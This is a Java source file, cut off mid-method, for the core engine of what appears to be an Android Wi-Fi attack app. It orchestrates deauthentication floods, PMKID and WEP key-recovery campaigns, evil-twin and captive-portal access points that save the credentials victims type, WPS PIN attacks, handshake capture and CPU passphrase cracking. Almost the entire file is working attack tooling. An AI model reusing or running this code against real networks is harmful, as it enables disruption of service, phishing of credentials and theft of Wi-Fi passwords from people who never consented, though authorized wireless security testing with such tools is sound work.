package com.opx.oss.engine;

import android.content.Context;
import android.hardware.usb.UsbDevice;
import android.hardware.usb.UsbManager;
import android.util.Log;

import com.opx.oss.AppLog;
import com.opx.oss.UsbHostBridge;
import com.opx.oss.engine.capture.HandshakeBook;
import com.opx.oss.engine.chips.ChipCatalog;
import com.opx.oss.engine.attacks.Campaign;
import com.opx.oss.engine.attacks.DeauthCampaign;
import com.opx.oss.engine.attacks.DecloakCampaign;
import com.opx.oss.engine.attacks.EvilTwin;
import com.opx.oss.engine.attacks.PmkidCampaign;
import com.opx.oss.engine.attacks.WepCampaign;
import com.opx.oss.engine.capture.Handshake;
import com.opx.oss.engine.capture.Verify;
import com.opx.oss.engine.crack.CpuCracker;
import com.opx.oss.engine.crack.WpsPinDb;
import com.opx.oss.engine.crack.WpsPins;
import com.opx.oss.engine.chips.WifiChip;
import com.opx.oss.engine.chips.firmware.FirmwareStore;
import com.opx.oss.engine.chips.ChipRegistry;
import com.opx.oss.engine.chips.Driver;
import com.opx.oss.engine.chips.PythonChip;
import com.opx.oss.engine.dot11.Eapol;
import com.opx.oss.engine.dot11.Mac;
import com.opx.oss.engine.dot11.Parser;

import com.opx.oss.engine.dot11.Frame;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.List;
import java.util.Map;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * The headless engine, in the app's own process: it speaks the same line protocol the screens
 * already use, one JSON object per command in and one event out.
 * <p>
 * This is the layer that replaces the external engine process. Its command and event names are
 * the protocol the app has always spoken, so the UI keeps its contract while the work behind it
 * is our own code, with no runtime to install and no interpreter to spawn.
 */
public final class NativeEngine {

    public static final String VERSION = "1.0.0";

    /** Every event the engine emits, in the same shape the app already parses. */
    public interface Listener {
        void onEvent(JSONObject event);
    }

    private static NativeEngine instance;

    private final Context context;
    private final Listener listener;
    private final ScanBook scan = new ScanBook();
    private final HandshakeBook handshakes = new HandshakeBook();
    private final ScanEngine scanEngine = new ScanEngine(scan);
    private final ProbeBook probes = new ProbeBook();
    private final WepBook wep = new WepBook();
    private final ExecutorService cracker = Executors.newSingleThreadExecutor(runnable -> {
        Thread thread = new Thread(runnable, "opx-crack");
        thread.setDaemon(true);
        return thread;
    });
    private volatile boolean cracking;
    private final java.util.Set<String> silenced =
            java.util.Collections.newSetFromMap(new java.util.concurrent.ConcurrentHashMap<>());
    private volatile WifiChip chip;
    /** Every adapter wifi4's array pools, by USB path; the first one is also {@link #chip}. */
    private final java.util.Map<String, WifiChip> cards = new java.util.LinkedHashMap<>();
    private volatile Campaign campaign;
    private volatile String campaignKind;
    private volatile String campaignBssid;
    private volatile EvilTwin twin;
    private final ExecutorService worker = Executors.newSingleThreadExecutor(runnable -> {
        Thread thread = new Thread(runnable, "opx-native-engine");
        thread.setDaemon(true);
        return thread;
    });
    private volatile boolean stopped;
    /** True once wifi4's own array has been attached, so a plain scan stop touches nothing. */
    private volatile boolean wifi4Attached;
    /** True while wifi4's backend is the one hopping the card for a scan. */
    private volatile boolean wifi4Scanning;
    private volatile int wifi4Count;
    /** Last signal emitted per BSSID, so a poll only pushes rows that actually changed. */
    private final java.util.Map<String, Integer> wifi4Sent = new java.util.HashMap<>();
    /** True once wifi4's vault knows where the app keeps its captures. */
    private volatile boolean wifi4Configured;
    /** One capture watcher per attached card; it turns wifi4's saves into capture_saved events. */
    private volatile boolean wifi4VaultWatch;

    private NativeEngine(Context context, Listener listener) {
        this.context = context;
        this.listener = listener;
    }

    /** Start the engine for {@code listener}; the {@code ready} event follows immediately. */
    public static synchronized NativeEngine start(Context context, Listener listener) {
        if (instance != null) return instance;
        NativeEngine engine = new NativeEngine(context.getApplicationContext(), listener);
        instance = engine;
        JSONObject ready = new JSONObject();
        try {
            ready.put("event", "ready");
            ready.put("version", VERSION);
            ready.put("runtime", engine.runtime());
        } catch (Exception ignored) {
            // A ready event without fields still tells the UI the engine is up.
        }
        engine.emit(ready);
        return engine;
    }

    public static synchronized void stop() {
        if (instance == null) return;
        instance.shutdown();
        instance = null;
    }

    public static synchronized boolean isRunning() {
        return instance != null && !instance.stopped;
    }

    /** Feed one command; a long campaign never blocks the caller or the next command. */
    public void send(JSONObject command) {
        if (stopped || command == null) return;
        worker.execute(() -> dispatch(command));
    }

    private void dispatch(JSONObject command) {
        String name = command.optString("cmd");
        try {
            switch (name) {
                case "":
                    error("no command");
                    break;
                case "ping":
                    emit(event("ready").put("version", VERSION).put("runtime", runtime()));
                    break;
                case "status":
                    emit(statusEvent());
                    break;
                case "usb_attach":
                    usbAttach();
                    break;
                case "usb_lost":
                    usbLost();
                    break;
                case "config":
                    emit(event("config").put("dfs", command.optBoolean("dfs", false)));
                    break;
                case "devices":
                    devices();
                    break;
                case "targets":
                    targets();
                    break;
                case "probed":
                    emit(event("probed").put("ssids", new JSONArray(probes.ssids())));
                    break;
                case "deauth_client":
                case "deauth_all":
                    if (wifi4Attached) {
                        // wifi4's deauth campaigns every associated client plus a broadcast burst,
                        // so its own one-shot path is the closest thing to both buttons.
                        wifi4Attack("deauth", command.optString("bssid"), null);
                    } else if ("deauth_all".equals(name)) {
                        deauthAll(command.optString("bssid"));
                    } else {
                        deauthClient(command.optString("bssid"), command.optString("client"));
                    }
                    break;
                case "silence":
                    silenced(command.optString("bssid"), command.optBoolean("on", true));
                    break;
                case "chop": {
                    JSONObject config = event("config");
                    config.put("chop", command.optBoolean("on", false));
                    emit(config);
                    break;
                }
                case "verify_psk":
                    verifyPsk(command.optString("bssid"), command.optString("psk"));
                    break;
                case "scan":
                    scan(command.optInt("seconds", 0));
                    break;
                case "stop_scan":
                    stopScan();
                    break;
                // wifi4's own backend (its WlanArray + campaigns, in Python next to the
                // driver). Additive: nothing above changes, these commands just route work
                // into the vendored engine instead of the Java one.
                case "wifi4_scan":
                    wifi4Scan(command.optInt("seconds", 0), command.optInt("interval_ms", 500));
                    break;
                case "wifi4_stop_scan":
                    wifi4StopScan();
                    break;
                case "wifi4_targets":
                    wifi4Targets();
                    break;
                case "wifi4_attack":
                    wifi4Attack(command.optString("kind"), command.optString("bssid"),
                            command.optJSONObject("options"));
                    break;
                case "wifi4_stop_attack":
                    wifi4StopAttack();
                    break;
                case "wifi4_status":
                    wifi4Status();
                    break;
                case "captures":
                    captures();
                    break;
                case "crack_tools":
                    crackTools();
                    break;
                case "cpu_crack":
                case "crack":
                    if (!wifi4Crack(command)) crack(command);
                    break;
                case "stop_crack":
                    stopCrack();
                    break;
                case "crack_status":
                    crackStatus();
                    break;
                case "attack":
                    if (wifi4Attached) {
                        wifi4AttackCommand(command);
                    } else {
                        attack(command);
                    }
                    break;
                case "stop_attack":
                    if (wifi4Attached) wifi4StopAttack();
                    else stopAttack();
                    break;
                case "attack_status":
                    attackStatus();
                    break;
                case "stop":
                    releaseRadio();
                    emit(event("stopped"));
                    shutdown();
                    break;
                default:
                    error("unknown command: " + name);
                    break;
            }
        } catch (Exception e) {
            error(name + " failed: " + e.getMessage());
        }
    }

    private void devices() throws Exception {
        JSONArray devices = new JSONArray();
        List<String> paths = UsbFd.list();
        UsbManager manager = (UsbManager) context.getSystemService(Context.USB_SERVICE);
        for (String path : paths) {
            JSONObject entry = new JSONObject();
            entry.put("path", path);
            UsbDevice device = manager == null ? null : device(manager, path);
            if (device != null) {
                entry.put("name", device.getDeviceName());
                entry.put("vendor_id", device.getVendorId());
                entry.put("product_id", device.getProductId());
                String model = ChipCatalog.model(device.getVendorId(), device.getProductId());
                entry.put("model", model == null ? "unsupported" : model);
                entry.put("supported", model != null);
                String firmware = ChipCatalog.firmware(
                        device.getVendorId(), device.getProductId());
                entry.put("firmware", firmware == null ? JSONObject.NULL : firmware);
                // The adapter row prints description (chipset), so an empty device path never
                // leaves the app showing a bare dash for a card it has already opened.
                entry.put("description", model == null ? path : model);
                entry.put("chipset", firmware == null ? JSONObject.NULL : firmware);
                entry.put("firmware_bundled", firmware != null
                        && !FirmwareStore.forChip(context, firmware).isEmpty());
            }
            devices.put(entry);
        }
        emit(event("devices").put("devices", devices).put("usb", usbState()));
    }

    /** Tune the adapter across the plan and fold every beacon it hears into the book. */
    private void scan(int seconds) throws Exception {
        if (scanEngine.isRunning()) {
            error("a scan is already running");
            return;
        }
        String path = firstSupportedDevice();
        if (path == null) {
            error("no supported adapter is attached");
            return;
        }
        scan.clear();
        WifiChip adapter = openChip(path);
        AppLog.info("OpxEngine", "adapter up: " + adapter.name() + " " + adapter.mac());
        if (wifi4ScanStart(seconds, 0.12)) {
            // wifi4's array now hops the card; frames still reach onFrame() for handshakes.
            adapter.startReceive(this::onFrame);
            return;
        }

        scanEngine.setPlan(true, false);
        scanEngine.start();
        emit(event("scan_started").put("adapter", adapter.name()));
        adapter.startReceive(this::onFrame);

        WifiChip hopping = adapter;
        Thread hop = new Thread(() -> {
            while (scanEngine.isRunning()) {
                int next = scanEngine.nextChannel();
                try {
                    hopping.setChannel(next);
                } catch (Exception e) {
                    if (scanEngine.isRunning()) error("channel " + next + ": " + e.getMessage());
                    scanEngine.stop();
                    break;
                }
                try {
                    Thread.sleep(120);
                } catch (InterruptedException interrupted) {
                    Thread.currentThread().interrupt();
                    break;
                }
            }
            emitScanDone();
        }, "opx-scan-hop");
        hop.setDaemon(true);
        hop.start();

        if (seconds > 0) {
            worker.execute(() -> {
                try {
                    Thread.sleep(seconds * 1000L);
                } catch (InterruptedException interrupted) {
                    Thread.currentThread().interrupt();
                    return;
                }
                stopScan();
            });
        }
    }

    /** Every frame the radio hears: folded into the scan book and read for a handshake. */
    private void onFrame(byte[] mpdu, int rssi) {
        if (mpdu == null || mpdu.length < 24) return;
        scanEngine.feed(mpdu, rssi);
        capture(mpdu);
    }

    /**
     * Reads a data frame for a four-way handshake or a probe request for a name. A completed
     * pair is written to the vault once and reported as {@code capture_saved}.
     */
    private void capture(byte[] mpdu) {
        int fc0 = mpdu[0] & 0xFF;
        int type = (fc0 >> 2) & 0x03;
        if (type == 2 && (mpdu[1] & 0x40) != 0) wep.feed(mpdu);
        if (type == 0 && Frame.subtype(fc0) == Frame.SUBTYPE_PROBE_REQ) {
            String ssid = Parser.probeRequestSsid(mpdu);
            byte[] requester = Parser.slice(mpdu, 10, 6);
            if (ssid != null) probes.record(Mac.text(requester), ssid);
            EvilTwin running = twin;
            if (running != null && ssid != null) running.offerProbe(requester);
            return;
        }
        if (type != 2) return;

        int headerLength = Mac.headerLength(fc0, mpdu[1] & 0xFF);
        Eapol eapol = Eapol.parse(mpdu, headerLength);
        if (eapol == null) return;

        boolean toDs = (mpdu[1] & 0x01) != 0;
        boolean fromDs = (mpdu[1] & 0x02) != 0;
        String addr1 = Mac.text(Parser.slice(mpdu, 4, 6));
        String addr2 = Mac.text(Parser.slice(mpdu, 10, 6));
        String addr3 = Mac.text(Parser.slice(mpdu, 16, 6));
        String bssid = toDs ? addr1 : (fromDs ? addr2 : addr3);
        String station = toDs ? addr2 : addr1;
        probes.associate(station, bssid);

        AccessPoint ap = scan.get(bssid);
        String ssid = ap == null ? "" : ap.ssid;
        Handshake known = handshakes.get(bssid, station);
        if (known != null && ap != null) known.sha256 = ap.akms.contains("PSK-SHA256");
        String line = handshakes.feed(bssid, station, ssid, eapol);
        Handshake stored = handshakes.get(bssid, station);
        if (stored != null && ap != null) stored.sha256 = ap.akms.contains("PSK-SHA256");
        if (line == null) return;
        if (wifi4Attached) {
            // wifi4's AP watcher owns the vault while it holds the card: it writes the
            // aggregate .hc22000 file next to the recovered keys, so a second copy here would
            // only split the same handshake across two directories. The in-memory book above
            // still feeds the live Verify check.
            return;
        }
        try {
            java.io.File saved = Vault.save(context, "capture_" + bssid.replace(':', '-') + ".22000",
                    (line + "\n").getBytes(java.nio.charset.StandardCharsets.UTF_8));
            emit(event("capture_saved").put("file", saved.getName())
                    .put("bssid", bssid).put("count", Vault.list(context).size()));
        } catch (Exception e) {
            error("cannot save the capture: " + e.getMessage());
        }
    }

    private WifiChip openChip(String path) throws Exception {
        WifiChip adapter = chip;
        if (adapter != null) {
            if (adapter.isUp()) return adapter;
            // The cached card died (unplug, firmware crash): wifi4's array died with it, so
            // both sides are dropped before this path opens a fresh one.
            releaseRadio();
        }
        UsbManager manager = (UsbManager) context.getSystemService(Context.USB_SERVICE);
        UsbDevice device = manager == null ? null : device(manager, path);
        if (device == null) throw new java.io.IOException("no USB device at " + path);
        Driver opened = ChipRegistry.open(context, device.getVendorId(),
                device.getProductId(), path);
        // ChipRegistry's open() already ran the staged bring-up, so this only caches it.
        adapter = opened;
        chip = adapter;
        cards.put(path, adapter);
        // The card is up now: tell the screens which interface is carrying the radio, so the
        // Wi-Fi card stops showing a dash in its INTERFACE cell while a scan runs.
        emitQuietly(statusEvent());
        return adapter;
    }

    /**
     * Search a wordlist or a mask against every capture for one network. Progress and the
     * result are events; {@code stop_crack} ends the search early.
     */
    private void crack(JSONObject command) throws Exception {
        if (cracking) {
            error("a search is already running");
            return;
        }
        String bssid = command.optString("bssid");
        java.util.List<Handshake> targets = new java.util.ArrayList<>();
        for (Handshake handshake : handshakes.list()) {
            if (!bssid.isEmpty() && !bssid.equalsIgnoreCase(handshake.bssid)) continue;
            if (handshake.eapolLine() != null || handshake.pmkidLine() != null) targets.add(handshake);
        }
        if (targets.isEmpty()) {
            error("no crackable capture for that network");
            return;
        }

        String file = command.optString("file");
        String mask = command.optString("mask");
        java.util.Iterator<String> candidates;
        long total;
        if (!file.isEmpty()) {
            java.io.File list = new java.io.File(file);
            if (!list.isFile()) {
                error("no such wordlist: " + file);
                return;
            }
            candidates = CpuCracker.wordlist(list, command.optString("rules"));
            total = -1;
        } else {
            if (mask.isEmpty()) mask = "?d?d?d?d?d?d?d?d";
            candidates = CpuCracker.expand(mask);
            total = CpuCracker.count(mask);
        }

        cracking = true;
        JSONObject started = event("crack_started");
        started.put("targets", targets.size()).put("total", total);
        emit(started);

        java.util.Iterator<String> source = candidates;
        long expected = total;
        cracker.execute(() -> {
            try {
                CpuCracker.Match match = CpuCracker.crack(targets, source, expected,
                        (tried, all, candidate) -> {
                            JSONObject progress = event("crack_progress");
                            try {
                                progress.put("tried", tried).put("total", all)
                                        .put("percent", all > 0 ? (tried * 100) / all : -1)
                                        .put("last", candidate == null ? "" : candidate);
                            } catch (Exception ignored) {
                                // Plain types only.
                            }
                            emitQuietly(progress);
                        },
                        () -> !cracking);
                JSONObject done = event("crack_done");
                done.put("ok", match != null);
                done.put("psk", match == null ? JSONObject.NULL : match.psk);
                done.put("tried", match == null ? 0 : match.tried);
                done.put("seconds", match == null ? 0 : match.millis / 1000);
                emitQuietly(done);
            } catch (Exception e) {
                error("the search failed: " + e.getMessage());
            } finally {
                cracking = false;
            }
        });
    }

    /** Keep what a client typed into the portal, next to the other captures. */
    private void savePortal(String bssid, JSONObject fields) {
        if (fields == null) return;
        StringBuilder text = new StringBuilder();
        for (java.util.Iterator<String> it = fields.keys(); it.hasNext(); ) {
            String key = it.next();
            text.append(key).append('=').append(fields.optString(key)).append('\n');
        }
        if (text.length() == 0) return;
        try {
            Vault.save(context, "portal_" + (bssid == null ? "unknown" : bssid.replace(':', '-')) + ".txt",
                    text.toString().getBytes(java.nio.charset.StandardCharsets.UTF_8));
        } catch (Exception e) {
            error("cannot save the portal capture: " + e.getMessage());
        }
    }

    /** Keep a recovered WEP key next to the other captures. */
    private void saveWepKey(String bssid, String key) {
        if (key == null || key.isEmpty()) return;
        try {
            Vault.save(context, "wep_" + (bssid == null ? "unknown" : bssid.replace(':', '-')) + ".key",
                    (key + "\n").getBytes(java.nio.charset.StandardCharsets.UTF_8));
        } catch (Exception e) {
            error("cannot save the WEP key: " + e.getMessage());
        }
    }

    /** Write one hashline to the vault and announce it, whoever captured it. */
    private void saveCaptureLine(String bssid, String line) {
        if (line == null || line.isEmpty()) return;
        try {
            java.io.File saved = Vault.save(context,
                    "capture_" + (bssid == null ? "unknown" : bssid.replace(':', '-')) + ".22000",
                    (line + "\n").getBytes(java.nio.charset.StandardCharsets.UTF_8));
            emit(event("capture_saved").put("file", saved.getName())
                    .put("bssid", bssid).put("count", Vault.list(context).size()));
        } catch (Exception e) {
            error("cannot save the capture: " + e.getMessage());
        }
    }

    /** One targeted deauth burst at a single station. */
    private void deauthClient(String bssid, String client) throws Exception {
        WifiChip adapter = requireChip(bssid);
        if (adapter == null) return;
        adapter.transmit(Frame.deauth(Mac.of(bssid), Mac.of(client), 7));
        JSONObject done = event("attack_done");
        done.put("ok", true).put("kind", "deauth_client");
        emit(done);
    }

    private void deauthAll(String bssid) throws Exception {
        WifiChip adapter = requireChip(bssid);
        if (adapter == null) return;
        adapter.transmit(Frame.deauthAll(Mac.of(bssid), 7));
        JSONObject done = event("attack_done");
        done.put("ok", true).put("kind", "deauth_all");
        emit(done);
    }

    private WifiChip requireChip(String bssid) throws Exception {
        String path = firstSupportedDevice();
        if (path == null) {
            error("no supported adapter is attached");
            return null;
        }
        WifiChip adapter = openChip(path);
        AccessPoint target = scan.get(bssid);
        if (target != null && target.channel > 0) adapter.setChannel(target.channel);
        return adapter;
    }

    private void silenced(String bssid, boolean on) {
        if (on) {
            silenced.add(bssid);
        } else {
            silenced.remove(bssid);
        }
        JSONObject reply = event("silence");
        try {
            reply.put("bssid", bssid).put("on", on);
        } catch (Exception ignored) {
            // A string and a boolean cannot fail to serialize.
        }
        emitQuietly(reply);
    }

    /** Check a candidate passphrase against the handshakes captured for this network. */
    private void verifyPsk(String bssid, String psk) {
        boolean ok = false;
        boolean any = false;
        for (Handshake handshake : handshakes.list()) {
            if (bssid != null && !bssid.isEmpty() && !bssid.equals(handshake.bssid)) continue;
            any = true;
            if (Verify.psk(handshake, psk)) {
                ok = true;
                break;
            }
        }
        JSONObject reply = event("psk_verified");
        try {
            reply.put("ok", ok).put("have_handshake", any);
        } catch (Exception ignored) {
            // Two booleans cannot fail to serialize.
        }
        emitQuietly(reply);
    }

    /** Start one campaign against one BSSID on the open adapter. */
    private void attack(JSONObject command) throws Exception {
        if (campaign != null) {
            error("an attack is already running");
            return;
        }
        String kind = command.optString("kind");
        String bssid = command.optString("bssid");
        if (bssid.isEmpty()) {
            error("no target BSSID");
            return;
        }
        String path = firstSupportedDevice();
        if (path == null) {
            error("no supported adapter is attached");
            return;
        }
        WifiChip adapter = openChip(path);
        AccessPoint target = scan.get(bssid);
        if (target != null && target.channel > 0) adapter.setChannel(target.channel);

        JSONObject options = command.optJSONObject("options");
        Campaign starting;
        switch (kind) {
            case "deauth":
                starting = new DeauthCampaign(adapter, bssid, options);
                break;
            case "decloak":
                starting = new DecloakCampaign(adapter, bssid, options, probes, scan);
                break;
            case "pmkid":
                starting = new PmkidCampaign(adapter, bssid, options, scan, handshakes);
                break;
            case "wep":
                starting = new WepCampaign(adapter, bssid, options, wep);
                break;
            case "eviltwin":
                starting = new EvilTwin(adapter, bssid, options, scan, false);
                break;
            case "captive":
                starting = new EvilTwin(adapter, bssid, options, scan, true);
                break;
            default:
                error(kind + " is not available yet");
                return;
        }

        campaign = starting;
        campaignKind = kind;
        campaignBssid = bssid;
        if (starting instanceof EvilTwin) twin = (EvilTwin) starting;
        emit(event("attack_started").put("kind", kind).put("bssid", bssid));
        Campaign running = starting;
        worker.execute(() -> {
            boolean ok = true;
            String summary = "";
            try {
                running.start(entry -> {
                    String name = entry.optString("event");
                    if ("capture_line".equals(name)) {
                        saveCaptureLine(entry.optString("bssid"), entry.optString("line"));
                        return;
                    }
                    if ("wep_key".equals(name)) {
                        saveWepKey(entry.optString("bssid"), entry.optString("key"));
                    }
                    if ("portal_credentials".equals(name)) {
                        savePortal(entry.optString("bssid"), entry.optJSONObject("fields"));
                    }
                    emitQuietly(entry);
                });
                summary = kind + " finished";
            } catch (Exception e) {
                ok = false;
                summary = e.getMessage();
            } finally {
                campaign = null;
                twin = null;
                JSONObject done = event("attack_done");
                try {
                    done.put("ok", ok).put("kind", kind).put("summary", summary);
                } catch (Exception ignored) {
                    // Both values are plain types.
                }
                emitQuietly(done);
            }
        });
    }

    private void stopAttack() {
        Campaign running = campaign;
        campaign = null;
        if (running != null) running.stop();
        emitQuietly(event("attack_stopped"));
    }

    private void attackStatus() {
        JSONObject status = event("attack_status");
        try {
            status.put("running", campaign != null);
            status.put("kind", campaignKind == null ? JSONObject.NULL : campaignKind);
            status.put("bssid", campaignBssid == null ? JSONObject.NULL : campaignBssid);
        } catch (Exception ignored) {
            // Every value is a plain type.
        }
        emitQuietly(status);
    }

    // -- wifi4's backend ----------------------------------------------------------------

    /**
     * Bring up every attached adapter wifi4's registry claims, one at a time, so its
     * {@code WlanArray} can pool them. Evil Twin hosts the twin on one card and punts from the
     * other when the twin sits off the target's channel; a plain scan is happy with one.
     * A card that refuses to open is skipped: the pool keeps whatever came up.
     */
    private void openAllChips() {
        UsbManager manager = (UsbManager) context.getSystemService(Context.USB_SERVICE);
        java.util.List<String> paths;
        try {
            paths = UsbFd.list();
        } catch (Exception failed) {
            AppLog.info("OpxEngine", "cannot ask the bridge for devices: " + failed.getMessage());
            return;
        }
        for (String path : paths) {
            if (cards.containsKey(path)) continue;
            try {
                UsbDevice device = manager == null ? null : device(manager, path);
                if (device == null) continue;
                if (!ChipRegistry.hasDriver(context, device.getVendorId(),
                        device.getProductId())) {
                    continue;
                }
                WifiChip opened = ChipRegistry.open(context, device.getVendorId(),
                        device.getProductId(), path);
                cards.put(path, opened);
                if (chip == null) chip = opened;
            } catch (Exception failed) {
                AppLog.info("OpxEngine", "adapter " + path + " stayed closed: "
                        + failed.getMessage());
            }
        }
        emitQuietly(statusEvent());
    }

    /**
     * Start wifi4's own provider: its {@code WlanArray} hops the card it shares with the
     * driver, so the AP table is built by wifi4's sink, not by this class.
     */
    private void wifi4Scan(int seconds, int intervalMs) throws Exception {
        if (firstSupportedDevice() == null) {
            error("no supported adapter is attached");
            return;
        }
        openAllChips();
        if (!wifi4ScanStart(seconds, Math.max(50, intervalMs) / 1000.0)) {
            error("wifi4's backend did not start the scan");
        }
    }

    /**
     * Hand the radio to wifi4's array. Returns false when the backend cannot start, leaving
     * everything untouched so the caller can fall back to the Java scan.
     */
    private boolean wifi4ScanStart(int seconds, double interval) {
        // A hub's other adapters join wifi4's pool here, before the array is built.
        openAllChips();
        try {
            wifi4Configure();
            if (!PythonChip.backendBool("start_scan", null, interval)) return false;
        } catch (Throwable failed) {
            AppLog.error("OpxEngine", failed);
            return false;
        }
        wifi4Attached = true;
        wifi4Scanning = true;
        startWifi4VaultWatch();
        wifi4Count = 0;
        synchronized (wifi4Sent) {
            wifi4Sent.clear();
        }
        JSONObject begun = event("scan_started");
        try {
            begun.put("adapter", "wifi4").put("backend", "wifi4");
        } catch (Exception ignored) {
            // Plain types.
        }
        emit(begun);
        Thread poll = new Thread(() -> {
            long deadline = seconds > 0
                    ? System.currentTimeMillis() + seconds * 1000L : Long.MAX_VALUE;
            while (wifi4Scanning && System.currentTimeMillis() < deadline) {
                wifi4Count = wifi4Refresh();
                try {
                    // wifi4's sink updates per frame; poll fast enough that the list behaves live.
                    Thread.sleep(250);
                } catch (InterruptedException interrupted) {
                    Thread.currentThread().interrupt();
                    break;
                }
            }
            if (wifi4Scanning) {
                wifi4Count = wifi4Refresh();
                stopScan();
            }
        }, "opx-wifi4-scan");
        poll.setDaemon(true);
        poll.start();
        return true;
    }

    private void wifi4StopScan() {
        boolean stopped = false;
        try {
            stopped = PythonChip.backendBool("stop_scan");
        } catch (RuntimeException failed) {
            AppLog.error("OpxEngine", failed);
        }
        JSONObject reply = event("wifi4_scan_stopped");
        try {
            reply.put("stopped", stopped);
        } catch (Exception ignored) {
            // A plain boolean.
        }
        emitQuietly(reply);
    }

    /**
     * Every AP wifi4's sink has seen: each one becomes the app's {@code network} row, so the same
     * list that the built-in path fills is filled from wifi4's own state.
     */
    private void wifi4Targets() {
        wifi4Refresh();
    }

    /** Emit wifi4's AP table as network rows; returns how many rows it holds. */
    private int wifi4Refresh() {
        return wifi4Refresh(false);
    }

    /**
     * Emit wifi4's rows. Without {@code force} only a new AP or a signal that moved by 3 dBm
     * goes out, so a 250 ms poll fills the list as frames arrive without re-sending everything.
     */
    private int wifi4Refresh(boolean force) {
        wifi4Configure();
        String json = PythonChip.backendText("targets");
        JSONArray rows;
        try {
            rows = new JSONArray(json == null || json.isEmpty() ? "[]" : json);
        } catch (Exception broken) {
            error("wifi4 targets: " + broken.getMessage());
            return 0;
        }
        JSONArray out = new JSONArray();
        synchronized (wifi4Sent) {
            for (int i = 0; i < rows.length(); i++) {
                JSONObject row = rows.optJSONObject(i);
                if (row == null) continue;
                try {
                    JSONObject network = new JSONObject(row.toString());
                    network.put("event", "network");
                    network.put("vendor", row.optString("vendor", ""));
                    network.put("security", bucketFor(row.optString("privacy")));
                    out.put(network);
                    String bssid = row.optString("bssid").toLowerCase(java.util.Locale.US);
                    int signal = row.optInt("signal", -100);
                    Integer before = wifi4Sent.get(bssid);
                    if (force || before == null || Math.abs(before - signal) >= 3) {
                        wifi4Sent.put(bssid, signal);
                        emitQuietly(network);
                    }
                } catch (Exception ignored) {
                    // One malformed row must not hide the rest.
                }
            }
        }
        JSONObject reply = event("wifi4_targets");
        try {
            reply.put("targets", out).put("count", out.length());
        } catch (Exception ignored) {
            // A plain array and a number.
        }
        emitQuietly(reply);
        return out.length();
    }

    /** Run one of wifi4's campaigns ({@code deauth}, {@code pmkid}, {@code pin}, …). */
    private void wifi4Attack(String kind, String bssid, JSONObject options) {
        wifi4Configure();
        startWifi4VaultWatch();
        boolean running = PythonChip.backendBool("attack", kind,
                bssid == null || bssid.isEmpty() ? null : bssid,
                options == null ? "" : options.toString());
        if (running) {
            JSONObject started = event("attack_started");
            try {
                started.put("kind", kind).put("bssid", bssid);
            } catch (Exception ignored) {
                // Two plain strings.
            }
            emitQuietly(started);
            watchWifi4Campaign(kind, bssid);
        } else {
            // The monitor would otherwise spin forever on a campaign that never took the radio.
            JSONObject done = event("attack_done");
            try {
                done.put("ok", false).put("kind", kind)
                        .put("summary", kind + " could not start")
                        .put("detail", "another wifi4 campaign still holds the radio");
            } catch (Exception ignored) {
                // Plain values only.
            }
            emitQuietly(done);
        }
        JSONObject reply = event("wifi4_attack");
        try {
            reply.put("running", running).put("kind", kind)
                    .put("bssid", bssid == null || bssid.isEmpty() ? JSONObject.NULL : bssid);
        } catch (Exception ignored) {
            // Plain types.
        }
        emitQuietly(reply);
    }

    /**
     * The app's monitor closes on {@code attack_done}, which only the Java campaigns emit: poll
     * wifi4's campaign status until it reports not running and close the monitor with it.
     */
    private void watchWifi4Campaign(String kind, String target) {
        Thread watcher = new Thread(() -> {
            PythonChip.ensurePython(context);
            java.util.Map<String, Integer> before = new java.util.HashMap<>();
            long startedAt = System.currentTimeMillis();
            // wifi4's dashboard classes: the three rate lines the meter draws, plus EAPOL and
            // the WEP IV counter (the same two rows wifi4 swaps by encryption family).
            String[] keys = {"data", "inject", "deauth", "eapol", "wep_iv"};
            int logSeen = 0;
            // No cap: wifi4's own campaign decides when it is done (a WPS sweep can legitimately
            // run for hours), and the watcher lives only as long as the engine.
            while (!stopped) {
                try {
                    Thread.sleep(1000);
                } catch (InterruptedException stopped) {
                    return;
                }
                try {
                    String json = PythonChip.backendText("attack_status");
                    JSONObject status = new JSONObject(json == null || json.isEmpty()
                            ? "{}" : json);
                    boolean running = status.optBoolean("running");
                    if (status.optBoolean("saved")) {
                        // A WEP key or WPS credential the campaign recovered just reached the
                        // vault; the screens refresh their capture/credential lists from this.
                        JSONObject savedEvent = event("capture_saved");
                        try {
                            savedEvent.put("bssid", target == null ? "" : target).put("kind", kind);
                        } catch (Exception ignored) {
                            // Two plain strings.
                        }
                        emitQuietly(savedEvent);
                    }
                    JSONObject snapshot = new JSONObject(PythonChip.backendText("progress"));
                    JSONObject counters = snapshot.optJSONObject("counters");
                    // The backend now hands over wifi4's own per-second rates (it diffs the
                    // cumulative counters exactly like the dashboard does). The delta below stays
                    // as the fallback for a sample that has no rate yet.
                    JSONObject sampled = snapshot.optJSONObject("rates");
                    JSONObject rates = new JSONObject();
                    JSONArray metrics = new JSONArray();
                    long seconds = Math.max(1, (System.currentTimeMillis() - startedAt) / 1000);
                    metrics.put(metric("elapsed", "ELAPSED", seconds + "s"));
                    for (String key : keys) {
                        int now = counters == null ? 0 : counters.optInt(key);
                        Integer was = before.put(key, now);
                        int delta = was == null ? 0 : Math.max(0, now - was);
                        long rate = sampled != null && sampled.has(key)
                                ? Math.max(0, Math.round(sampled.optDouble(key, 0d))) : delta;
                        rates.put(key, rate);
                        // The chips above the meter carry the same number its row draws, so the
                        // top of the screen says which class is running and how fast.
                        metrics.put(metric(key, rateLabel(key), rate + "/s"));
                    }
                    // wifi4's campaigns log instead of emitting events: forward the new lines so
                    // the monitor's Terminal tab shows what the backend is doing.
                    JSONArray logLines = snapshot.optJSONArray("log");
                    if (logLines != null) {
                        if (logLines.length() < logSeen) logSeen = 0;
                        for (int j = logSeen; j < logLines.length(); j++) {
                            String line = logLines.optString(j);
                            if (line.isEmpty()) continue;
                            emitQuietly(event("attack_log").put("line", line));
                        }
                        logSeen = logLines.length();
                    }
                    // The monitor reads rates/metrics from its nested ``progress`` object.
                    JSONObject progress = new JSONObject();
                    progress.put("rates", rates).put("metrics", metrics);
                    JSONObject entry = event("attack_progress");
                    entry.put("kind", kind).put("progress", progress)
                            .put("bssid", target == null ? "" : target);
                    JSONArray lines = snapshot.optJSONArray("lines");
                    if (lines != null) entry.put("lines", lines);
                    emitQuietly(entry);
                    if (!running) {
                        // wifi4's own reason wins: a sweep that ran out of candidates or an AP
                        // that stayed locked is a failure, not a quiet success.
                        String error = status.optString("error", "");
                        String reason = status.optString("reason", "");
                        String problem = !error.isEmpty() ? error : reason;
